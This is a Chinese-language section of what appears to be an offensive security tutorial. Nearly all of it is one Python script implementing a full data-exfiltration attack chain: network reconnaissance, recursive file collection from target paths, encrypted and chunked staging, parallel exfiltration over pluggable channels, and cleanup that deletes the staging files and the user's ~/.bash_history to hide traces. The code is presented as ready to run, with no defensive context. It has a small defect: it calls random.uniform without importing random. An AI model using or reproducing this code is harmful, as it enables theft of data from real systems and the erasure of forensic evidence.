## 攻击链整合 (Attack Chain Integration)

### 完整攻击链示例

```python
#!/usr/bin/env python3
"""
数据外泄攻击链整合
从初始访问到数据外泄的完整流程
"""

import os
import sys
import time
import json
import threading
import queue
from typing import List, Dict, Optional, Callable
from enum import Enum
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

class AttackPhase(Enum):
    """攻击阶段"""
    RECON = "reconnaissance"
    INITIAL_ACCESS = "initial_access"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DISCOVERY = "discovery"
    COLLECTION = "collection"
    STAGING = "staging"
    EXFILTRATION = "exfiltration"
    CLEANUP = "cleanup"

@dataclass
class ExfilResult:
    """外泄结果"""
    success: bool
    channel: str
    bytes_sent: int
    duration: float
    errors: List[str]

class ExfiltrationChain:
    """数据外泄攻击链"""

    def __init__(self):
        self.phase = AttackPhase.RECON
        self.collected_data = {}
        self.staging_path = "/tmp/.exfil_staging"
        self.exfil_queue = queue.Queue()
        self.results = []
        self.active_channels = []
        self.max_retries = 3

    def phase_1_reconnaissance(self, target_network: str) -> Dict:
        """
        阶段1: 侦察
        收集目标网络信息，识别可用的外泄通道
        """
        print("[*] 阶段1: 侦察中...")

        recon_data = {
            "network": target_network,
            "open_ports": [],
            "available_protocols": [],
            "dlp_detected": False,
            "proxy_detected": False,
            "dns_servers": [],
            "cloud_access": False,
            "usb_accessible": False,
        }

        # 检测可用协议
        import socket
        common_ports = {
            53: "DNS",
            80: "HTTP",
            443: "HTTPS",
            22: "SSH",
            8080: "HTTP-ALT",
            8443: "HTTPS-ALT",
        }

        for port, protocol in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex(("8.8.8.8", port))
                if result == 0:
                    recon_data["available_protocols"].append(protocol)
                sock.close()
            except Exception:
                pass

        # 检测DNS服务器
        recon_data["dns_servers"] = self._detect_dns_servers()

        # 检测云访问
        recon_data["cloud_access"] = self._check_cloud_access()

        # 检测USB
        recon_data["usb_accessible"] = self._check_usb_access()

        self.phase = AttackPhase.INITIAL_ACCESS
        return recon_data

    def _detect_dns_servers(self) -> List[str]:
        """检测DNS服务器"""
        dns_servers = []
        try:
            with open("/etc/resolv.conf", "r") as f:
                for line in f:
                    if line.startswith("nameserver"):
                        dns_servers.append(line.split()[1])
        except Exception:
            dns_servers = ["8.8.8.8"]
        return dns_servers

    def _check_cloud_access(self) -> bool:
        """检测云服务访问"""
        cloud_endpoints = [
            "https://s3.amazonaws.com",
            "https://blob.core.windows.net",
            "https://storage.googleapis.com",
        ]
        import requests
        for endpoint in cloud_endpoints:
            try:
                resp = requests.head(endpoint, timeout=3)
                if resp.status_code < 500:
                    return True
            except Exception:
                continue
        return False

    def _check_usb_access(self) -> bool:
        """检测USB访问"""
        return os.path.exists("/media/") or os.path.exists("/mnt/")

    def phase_2_collection(self, target_paths: List[str]) -> Dict:
        """
        阶段2: 数据收集
        收集目标数据并计算哈希
        """
        print("[*] 阶段2: 数据收集中...")

        for path in target_paths:
            if os.path.exists(path):
                if os.path.isfile(path):
                    with open(path, "rb") as f:
                        self.collected_data[path] = f.read()
                elif os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, "rb") as f:
                                    self.collected_data[filepath] = f.read()
                            except Exception:
                                continue

        total_size = sum(len(v) for v in self.collected_data.values())
        print(f"[+] 收集完成: {len(self.collected_data)} 文件, {total_size} bytes")

        self.phase = AttackPhase.STAGING
        return {
            "files": len(self.collected_data),
            "total_size": total_size,
            "paths": list(self.collected_data.keys()),
        }

    def phase_3_staging(self) -> str:
        """
        阶段3: 数据暂存
        压缩、加密、分片
        """
        print("[*] 阶段3: 数据暂存中...")

        os.makedirs(self.staging_path, exist_ok=True)

        # 打包所有数据
        import tarfile
        import io

        archive_path = os.path.join(self.staging_path, "data.tar.gz")
        with tarfile.open(archive_path, "w:gz") as tar:
            for filepath, data in self.collected_data.items():
                info = tarfile.TarInfo(name=os.path.basename(filepath))
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))

        # 加密
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        key = AESGCM.generate_key(bit_length=256)
        aesgcm = AESGCM(key)

        with open(archive_path, "rb") as f:
            plaintext = f.read()

        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, b"staging")

        encrypted_path = os.path.join(self.staging_path, "data.enc")
        with open(encrypted_path, "wb") as f:
            f.write(nonce + ciphertext)

        # 保存密钥
        key_path = os.path.join(self.staging_path, "key.bin")
        with open(key_path, "wb") as f:
            f.write(key)

        # 分片
        chunk_size = 1024 * 512  # 512KB
        chunks = []
        with open(encrypted_path, "rb") as f:
            chunk_idx = 0
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                chunk_path = os.path.join(self.staging_path, f"chunk_{chunk_idx:04d}.bin")
                with open(chunk_path, "wb") as cf:
                    cf.write(chunk)
                chunks.append(chunk_path)
                chunk_idx += 1

        print(f"[+] 暂存完成: {len(chunks)} chunks, 密钥: {key_path}")

        self.phase = AttackPhase.EXFILTRATION
        return encrypted_path

    def phase_4_exfiltration(self, channels: List[Callable]) -> List[ExfilResult]:
        """
        阶段4: 数据外泄
        使用多个通道并行外泄
        """
        print("[*] 阶段4: 数据外泄中...")

        chunk_files = [f for f in os.listdir(self.staging_path) if f.startswith("chunk_")]
        chunk_files.sort()

        total_chunks = len(chunk_files)
        active_channels = len(channels)

        # 分配chunk到通道
        assignments = {}
        for i, chunk_file in enumerate(chunk_files):
            channel_idx = i % active_channels
            if channel_idx not in assignments:
                assignments[channel_idx] = []
            assignments[channel_idx].append(chunk_file)

        # 并行外泄
        results = []
        with ThreadPoolExecutor(max_workers=active_channels) as executor:
            futures = []
            for channel_idx, chunks in assignments.items():
                channel_func = channels[channel_idx]
                chunk_paths = [os.path.join(self.staging_path, c) for c in chunks]
                futures.append(
                    executor.submit(self._exfiltrate_chunks, channel_func, chunk_paths)
                )

            for future in futures:
                result = future.result()
                results.append(result)

        self.results = results
        self.phase = AttackPhase.CLEANUP

        return results

    def _exfiltrate_chunks(self, channel_func: Callable, chunk_paths: List[str]) -> ExfilResult:
        """外泄一组chunk"""
        channel_name = channel_func.__name__
        total_bytes = 0
        errors = []
        start_time = time.time()

        for chunk_path in chunk_paths:
            retries = 0
            while retries < self.max_retries:
                try:
                    with open(chunk_path, "rb") as f:
                        data = f.read()
                    channel_func(data)
                    total_bytes += len(data)
                    break
                except Exception as e:
                    retries += 1
                    errors.append(f"{chunk_path}: {str(e)}")
                    time.sleep(random.uniform(1, 3))

        duration = time.time() - start_time
        return ExfilResult(
            success=len(errors) == 0,
            channel=channel_name,
            bytes_sent=total_bytes,
            duration=duration,
            errors=errors,
        )

    def phase_5_cleanup(self) -> bool:
        """
        阶段5: 清理
        删除临时文件和日志
        """
        print("[*] 阶段5: 清理中...")

        if os.path.exists(self.staging_path):
            import shutil
            shutil.rmtree(self.staging_path)

        # 清理日志
        log_files = [
            "/tmp/.exfil.log",
            os.path.expanduser("~/.bash_history"),
        ]

        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    os.remove(log_file)
                except Exception:
                    pass

        print("[+] 清理完成")
        return True

    def execute_full_chain(self, target_network: str, target_paths: List[str],
                           channels: List[Callable]) -> Dict:
        """
        执行完整攻击链
        """
        print("=" * 60)
        print("数据外泄攻击链启动")
        print("=" * 60)

        # 阶段1: 侦察
        recon = self.phase_1_reconnaissance(target_network)

        # 阶段2: 收集
        collection = self.phase_2_collection(target_paths)

        # 阶段3: 暂存
        staging = self.phase_3_staging()

        # 阶段4: 外泄
        exfiltration = self.phase_4_exfiltration(channels)

        # 阶段5: 清理
        self.phase_5_cleanup()

        return {
            "reconnaissance": recon,
            "collection": collection,
            "staging_path": staging,
            "exfiltration_results": [
                {
                    "channel": r.channel,
                    "success": r.success,
                    "bytes_sent": r.bytes_sent,
                    "duration": r.duration,
                }
                for r in exfiltration
            ],
            "cleanup": True,
        }
```

